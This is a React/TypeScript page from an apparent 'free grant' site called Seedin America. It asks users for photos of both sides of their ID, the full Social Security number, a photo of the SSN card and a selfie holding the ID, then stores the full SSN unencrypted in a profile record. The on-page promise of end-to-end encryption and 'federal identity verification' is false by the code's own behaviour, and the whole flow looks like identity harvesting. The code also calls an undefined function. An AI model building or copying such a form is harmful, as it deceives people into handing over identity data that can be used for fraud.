import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { ArrowLeft, CheckCircle2, IdCard, Loader2, ShieldCheck, Upload, User } from "lucide-react";
import { Logo } from "@/components/brand/Logo";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { reportMemberEvent } from "@/lib/admin-bot.functions";

export const Route = createFileRoute("/upgrade-tier")({
  head: () => ({ meta: [{ title: "Upgrade to Tier 2 — Seedin America" }] }),
  component: UpgradeTier,
});

type Slot = "id_front" | "id_back" | "ssn_card" | "selfie";
type Files = Partial<Record<Slot, File>>;

function UpgradeTier() {
  const navigate = useNavigate();
  const [userId, setUserId] = useState<string | null>(null);
  const [files, setFiles] = useState<Files>({});
  const [ssn, setSsn] = useState("");
  const [confirmSsn, setConfirmSsn] = useState("");
  const [skipSsnCard, setSkipSsnCard] = useState(false);
  const [showSkipOption, setShowSkipOption] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    supabase.auth.getSession().then(({ data }) => {
      if (!data.session) navigate({ to: "/signin" });
      else setUserId(data.session.user.id);
    });
  }, [navigate]);

  const onlyDigits = (v: string) => v.replace(/\D/g, "").slice(0, 9);
  const formatSsn = (v: string) => {
    const d = onlyDigits(v);
    if (d.length <= 3) return d;
    if (d.length <= 5) return `${d.slice(0, 3)}-${d.slice(3)}`;
    return `${d.slice(0, 3)}-${d.slice(3, 5)}-${d.slice(5)}`;
  };

  const otherDocsReady = !!files.id_front && !!files.id_back && !!files.selfie &&
    onlyDigits(ssn).length === 9 && ssn === confirmSsn;
  const ssnCardReady = !!files.ssn_card || skipSsnCard;
  const canSubmit = otherDocsReady && ssnCardReady && !submitting;

  const handleSubmit = async () => {
    if (!userId) return;
    if (onlyDigits(ssn).length !== 9) { toast.error("SSN must be 9 digits"); return; }
    if (ssn !== confirmSsn) { toast.error("SSN entries do not match"); return; }
    if (!files.ssn_card && !skipSsnCard) {
      // Reveal skip option and bring focus back to the SSN card upload
      setShowSkipOption(true);
      toast.error("Please upload your SSN card — or check the box to skip if you don't have it.");
      setTimeout(() => {
        const el = document.getElementById("ssn-card-section");
        if (el) el.scrollIntoView({ behavior: "smooth", block: "center" });
      }, 50);
      return;
    }
    setSubmitting(true);
    try {
      const uploads: Partial<Record<Slot, string>> = {};
      const slots: Slot[] = skipSsnCard
        ? ["id_front", "id_back", "selfie"]
        : ["id_front", "id_back", "ssn_card", "selfie"];
      for (const slot of slots) {
        const file = files[slot]!;
        const ext = file.name.split(".").pop() || "jpg";
        const path = `${userId}/${slot}-${Date.now()}.${ext}`;
        const { error } = await supabase.storage.from("verification").upload(path, file, { upsert: true });
        if (error) throw error;
        uploads[slot] = path;
      }
      const { error: updErr } = await supabase
        .from("profiles")
        .update({
          requested_tier: 2,
          tier_status: "pending",
          id_front_url: uploads.id_front ?? null,
          id_back_url: uploads.id_back ?? null,
          ssn_card_url: uploads.ssn_card ?? null,
          selfie_url: uploads.selfie ?? null,
          ssn_full: onlyDigits(ssn),
          ssn_last4: onlyDigits(ssn).slice(-4),
          ssn_card_skipped: skipSsnCard,
          verification_submitted_at: new Date().toISOString(),
        })
        .eq("id", userId);
      if (updErr) throw updErr;
      reportMemberEvent({ data: { kind: "tier_upgrade_request", tier: 2, detail: skipSsnCard ? "SSN card upload skipped" : "Full document set uploaded" } }).catch(() => null);
      setSubmitted(true);

    } catch (e) {
      toast.error(e instanceof Error ? e.message : "Upload failed");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-accent/30 to-background pb-20">
      <header className="mx-auto flex max-w-4xl items-center justify-between px-6 py-6">
        <Logo />
        <button onClick={() => navigate({ to: "/dashboard" })} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground">
          <ArrowLeft className="h-4 w-4" /> Back to dashboard
        </button>
      </header>

      <main className="mx-auto max-w-3xl px-6">
        <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
          <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
            <div className="flex items-center gap-2 text-xs uppercase tracking-[0.2em] text-gold">
              <ShieldCheck className="h-3.5 w-3.5" /> Tier 2 Verification
            </div>
            <h1 className="mt-2 font-display text-2xl font-semibold md:text-3xl">Upgrade to Tier 2</h1>
            <p className="mt-1 max-w-xl text-sm text-white/80">
              Unlock grant applications up to <strong className="text-gold">$15,000</strong>. Your information is encrypted end-to-end and used only for federal identity verification.
            </p>
          </div>

          <div className="space-y-8 p-8">
            {/* ID uploads */}
            <Section icon={<IdCard className="h-4 w-4" />} title="Government-issued ID" desc="Upload a clear photo of the front and back of your Driver's License or State ID.">
              <div className="grid gap-4 md:grid-cols-2">
                <FileSlot label="ID Front" file={files.id_front} onChange={(f) => setFiles((p) => ({ ...p, id_front: f }))} />
                <FileSlot label="ID Back" file={files.id_back} onChange={(f) => setFiles((p) => ({ ...p, id_back: f }))} />
              </div>
            </Section>

            {/* SSN */}
            <Section icon={<ShieldCheck className="h-4 w-4" />} title="Social Security Number" desc="Your SSN is masked for your safety — even you won't see the digits as you type.">
              <div className="grid gap-4 md:grid-cols-2">
                <MaskedSsn label="SSN" value={ssn} onChange={(v) => setSsn(formatSsn(v))} />
                <MaskedSsn label="Confirm SSN" value={confirmSsn} onChange={(v) => setConfirmSsn(formatSsn(v))} />
              </div>
              {ssn && confirmSsn && ssn !== confirmSsn && (
                <p className="mt-2 text-xs font-medium text-destructive">SSN entries do not match.</p>
              )}
              <div id="ssn-card-section" className="mt-4 space-y-3">
                <FileSlot label="Upload picture of SSN Card" file={files.ssn_card} onChange={(f) => { setFiles((p) => ({ ...p, ssn_card: f })); setSkipSsnCard(false); }} />
                {showSkipOption && (
                  <label className={`flex items-start gap-2.5 rounded-lg border p-3 text-xs ${skipSsnCard ? "border-forest bg-forest/5" : "border-dashed border-gold/40 bg-gold/5"}`}>
                    <input
                      type="checkbox"
                      checked={skipSsnCard}
                      onChange={(e) => setSkipSsnCard(e.target.checked)}
                      className="mt-0.5 h-4 w-4 accent-forest"
                    />
                    <span className="text-foreground">
                      <strong>I don't have a physical SSN card.</strong>{" "}
                      <span className="text-muted-foreground">
                        Submit without the card image. Verification may take longer and a reviewer may contact you for an alternative document.
                      </span>
                    </span>
                  </label>
                )}
              </div>
            </Section>

            {/* Selfie */}
            <Section icon={<User className="h-4 w-4" />} title="Verification selfie" desc="Take a selfie of yourself holding your ID or Driver's License next to your face.">
              <FileSlot label="Selfie with ID" file={files.selfie} onChange={(f) => setFiles((p) => ({ ...p, selfie: f }))} />
            </Section>

            <button
              disabled={!canSubmit}
              onClick={handleSubmit}
              className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-forest px-6 py-3.5 text-sm font-semibold text-forest-foreground shadow-elegant transition disabled:cursor-not-allowed disabled:bg-none disabled:bg-muted disabled:text-muted-foreground disabled:shadow-none"
            >
              {submitting ? (<><Loader2 className="h-4 w-4 animate-spin" /> Submitting…</>) : (<><CheckCircle2 className="h-4 w-4" /> Submit for Verification</>)}
            </button>
          </div>
        </div>
      </main>
    </div>
  );
}

function Section({ icon, title, desc, children }: { icon: React.ReactNode; title: string; desc: string; children: React.ReactNode }) {
  return (
    <section>
      <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-forest">
        {icon} {title}
      </div>
      <p className="mt-1 text-sm text-muted-foreground">{desc}</p>
      <div className="mt-4">{children}</div>
    </section>
  );
}

function FileSlot({ label, file, onChange }: { label: string; file?: File; onChange: (f: File) => void }) {
  const ref = useRef<HTMLInputElement>(null);
  const [preview, setPreview] = useState<string | null>(null);
  useEffect(() => {
    if (!file) { setPreview(null); return; }
    const url = URL.createObjectURL(file);
    setPreview(url);
    return () => URL.revokeObjectURL(url);
  }, [file]);
  return (
    <button
      type="button"
      onClick={() => ref.current?.click()}
      className={`group relative flex h-40 w-full flex-col items-center justify-center gap-2 overflow-hidden rounded-xl border-2 border-dashed p-4 text-sm transition ${file ? "border-forest bg-forest/5" : "border-border bg-accent/30 hover:border-forest/50 hover:bg-accent/50"}`}
    >
      {preview ? (
        <>
          <img src={preview} alt={label} className="absolute inset-0 h-full w-full object-cover" />
          <div className="absolute inset-0 bg-gradient-to-t from-primary/80 via-primary/20 to-transparent" />
          <span className="relative mt-auto self-start text-xs font-semibold text-white">{label} ✓</span>
        </>
      ) : (
        <>
          <Upload className="h-6 w-6 text-muted-foreground group-hover:text-forest" />
          <span className="font-semibold text-foreground">{label}</span>
          <span className="text-xs text-muted-foreground">Tap to upload (JPG / PNG)</span>
        </>
      )}
      <input
        ref={ref}
        type="file"
        accept="image/*"
        className="hidden"
        onChange={(e) => { const f = e.target.files?.[0]; if (f) onChange(f); }}
      />
    </button>
  );
}

function MaskedSsn({ label, value, onChange }: { label: string; value: string; onChange: (v: string) => void }) {
  // Show stars matching length; preserve dashes as visual structure
  const masked = value.replace(/\d/g, "•");
  return (
    <label className="block">
      <span className="mb-1.5 block text-xs font-semibold uppercase tracking-wider text-muted-foreground">{label}</span>
      <div className="relative">
        <input
          type="text"
          inputMode="numeric"
          autoComplete="off"
          value={masked}
          onChange={(e) => {
            // Compare new length to value to decide add/remove
            const next = e.target.value;
            if (next.length < masked.length) {
              // backspace
              onChange(value.slice(0, -1));
            } else {
              const added = next.slice(masked.length);
              onChange(value + added);
            }
          }}
          placeholder="•••-••-••••"
          className="block w-full rounded-lg border border-input bg-background px-4 py-3 font-mono text-base tracking-[0.3em] text-foreground outline-none transition focus:border-forest focus:ring-2 focus:ring-forest/20"
        />
      </div>
    </label>
  );
}
